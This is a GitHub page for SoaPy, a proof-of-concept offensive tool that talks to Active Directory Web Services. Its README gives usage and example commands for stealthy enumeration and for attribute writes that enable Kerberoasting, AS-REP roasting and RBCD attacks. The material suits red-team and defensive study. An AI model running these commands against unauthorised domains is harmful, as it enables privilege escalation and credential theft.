# https://github.com/gmh5225/SoaPy

[Skip to content](https://github.com/gmh5225/SoaPy#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/gmh5225/SoaPy) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/gmh5225/SoaPy) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/gmh5225/SoaPy) to refresh your session.Dismiss alert

{{ message }}

[gmh5225](https://github.com/gmh5225)/ **[SoaPy](https://github.com/gmh5225/SoaPy)** Public

forked from [xforcered/SoaPy](https://github.com/xforcered/SoaPy)

- [Notifications](https://github.com/login?return_to=%2Fgmh5225%2FSoaPy) You must be signed in to change notification settings
- [Fork\\
0](https://github.com/login?return_to=%2Fgmh5225%2FSoaPy)
- [Star\\
0](https://github.com/login?return_to=%2Fgmh5225%2FSoaPy)


main

[**1** Branch](https://github.com/gmh5225/SoaPy/branches) [**0** Tags](https://github.com/gmh5225/SoaPy/tags)

[Go to Branches page](https://github.com/gmh5225/SoaPy/branches)[Go to Tags page](https://github.com/gmh5225/SoaPy/tags)

Go to file

Code

Open more actions menu

This branch is up to date with xforcered/SoaPy:main.

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![logangoins](https://avatars.githubusercontent.com/u/55106700?v=4&size=40)](https://github.com/logangoins)[logangoins](https://github.com/gmh5225/SoaPy/commits?author=logangoins)<br>[Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6)<br>last yearFeb 21, 2025<br>[2669dcb](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6) · last yearFeb 21, 2025<br>## History<br>[1 Commit](https://github.com/gmh5225/SoaPy/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/gmh5225/SoaPy/commits/main/) 1 Commit |
| [src](https://github.com/gmh5225/SoaPy/tree/main/src "src") | [src](https://github.com/gmh5225/SoaPy/tree/main/src "src") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| [tests](https://github.com/gmh5225/SoaPy/tree/main/tests "tests") | [tests](https://github.com/gmh5225/SoaPy/tree/main/tests "tests") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| [.gitignore](https://github.com/gmh5225/SoaPy/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/gmh5225/SoaPy/blob/main/.gitignore ".gitignore") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| [README.md](https://github.com/gmh5225/SoaPy/blob/main/README.md "README.md") | [README.md](https://github.com/gmh5225/SoaPy/blob/main/README.md "README.md") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| [poetry.lock](https://github.com/gmh5225/SoaPy/blob/main/poetry.lock "poetry.lock") | [poetry.lock](https://github.com/gmh5225/SoaPy/blob/main/poetry.lock "poetry.lock") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| [pyproject.toml](https://github.com/gmh5225/SoaPy/blob/main/pyproject.toml "pyproject.toml") | [pyproject.toml](https://github.com/gmh5225/SoaPy/blob/main/pyproject.toml "pyproject.toml") | [Initial push](https://github.com/gmh5225/SoaPy/commit/2669dcb67ab692441f437e527ea61a943ca041b6 "Initial push") | last yearFeb 21, 2025 |
| View all files |

## Repository files navigation

# Description

[Permalink: Description](https://github.com/gmh5225/SoaPy#description)

SoaPy is a Proof of Concept (PoC) tool for conducting offensive interaction with Active Directory Web Services (ADWS) from Linux hosts. SoaPy includes previously undeveloped custom python implementations of a collection of Microsoft protocols required for interaction with the ADWS service. This includes but is not limited to: NNS (.NET NegotiateStream Protocol), NMF (.NET Message Framing Protocol), and NBFSE (.NET Binary Format: SOAP Extension).

SoaPy can be primarily utilized to interact with ADWS for stealthy enumeration over a proxy into an internal Active Directory environment. Additionally SoaPy can perform targeted exploitation over ADWS, including `servicePrincipalName` writing for targeted Kerberoasting, `DON’T_REQ_PREAUTH` writing for targeted ASREP-Roasting, and the ability to write to `msDs-AllowedToActOnBehalfOfOtherIdentity` for Resource-Based Constrained Delegation attacks.

# Usage

[Permalink: Usage](https://github.com/gmh5225/SoaPy#usage)

```

███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝
███████║╚██████╔╝██║  ██║██║        ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝

usage: soapy [-h] [--debug] [--ts] [--hash nthash] [--users] [--computers] [--groups] [--constrained] [--unconstrained] [--spns] [--asreproastable] [--admins] [--rbcds]
             [-q query] [--filter attr,attr,...] [--rbcd source] [--spn value] [--asrep] [--account account] [--remove]
             connection

Enumerate and write LDAP objects over ADWS using the SOAP protocol

positional arguments:
  connection            domain/username[:password]@<targetName or address>

options:
  -h, --help            show this help message and exit
  --debug               Turn DEBUG output ON
  --ts                  Adds timestamp to every logging output.
  --hash nthash         Use an NT hash for authentication

Enumeration:
  --users               Enumerate user objects
  --computers           Enumerate computer objects
  --groups              Enumerate group objects
  --constrained         Enumerate objects with the msDS-AllowedToDelegateTo attribute set
  --unconstrained       Enumerate objects with the TRUSTED_FOR_DELEGATION flag set
  --spns                Enumerate accounts with the servicePrincipalName attribute set
  --asreproastable      Enumerate accounts with the DONT_REQ_PREAUTH flag set
  --admins              Enumerate high privilege accounts
  --rbcds               Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set
  -q query, --query query
                        Raw query to execute on the target
  --filter attr,attr,...
                        Attributes to select from the objects returned, in a comma seperated list

Writing:
  --rbcd source         Operation to write or remove RBCD. Also used to pass in the source computer account used for the attack.
  --spn value           Operation to write the servicePrincipalName attribute value, writes by default unless "--remove" is specified
  --asrep               Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target object
  --account account     Account to preform an operation on
  --remove              Operarion to remove an attribute value based off an operation
```

# Installation

[Permalink: Installation](https://github.com/gmh5225/SoaPy#installation)

With `pipx`:

```
pipx install .
```

With `poetry`:

```
poetry install
```

# Example Usage

[Permalink: Example Usage](https://github.com/gmh5225/SoaPy#example-usage)

Enumerate users using preset enumeration flags:

```
soapy <domain>/<user>:'<password>'@<ip> --users
```

Enumerate computers `samAccountName` and `objectSid` using a custom query/attribute filtering:

```
soapy <domain>/<user>:'<password>'@<ip> --query '(objectClass=computer)' --filter "samaccountname,objectsid"
```

Write `msDs-AllowedToActOnBehalfOfOtherIdentity` on DC01, enabling delegation from MS01 for an RBCD attack:

```
soapy <domain>/<user>:'<password>'@<ip> --rbcd 'MS01$' --account 'DC01$'
```

Write the `servicePrincipalName` attribute on jdoe as part of a targeted Kerberoasting attack:

```
soapy <domain>/<user>:'<password>'@<ip> --spn test/spn --account jdoe
```

Write `DONT_REQ_PREAUTH` (0x400000) on jdoe's `userAccountControl` attribute, making the account ASREP-Roastable:

```
soapy <domain>/<user>:'<password>'@<ip> --asrep --account jdoe
```

## About

SoaPy is a Proof of Concept (PoC) tool for conducting offensive interaction with Active Directory Web Services (ADWS) from Linux hosts.


### Resources

[Readme](https://github.com/gmh5225/SoaPy#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/gmh5225/SoaPy).

[Activity](https://github.com/gmh5225/SoaPy/activity)

### Stars

[**0**\\
stars](https://github.com/gmh5225/SoaPy/stargazers)

### Watchers

[**0**\\
watching](https://github.com/gmh5225/SoaPy/watchers)

### Forks

[**0**\\
forks](https://github.com/gmh5225/SoaPy/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fgmh5225%2FSoaPy&report=gmh5225+%28user%29)

## [Releases](https://github.com/gmh5225/SoaPy/releases)

No releases published

## [Packages\  0](https://github.com/users/gmh5225/packages?repo_name=SoaPy)

No packages published

## [Contributors\  0](https://github.com/gmh5225/SoaPy/graphs/contributors)

No contributors


## Languages

- Python100.0%

You can’t perform that action at this time.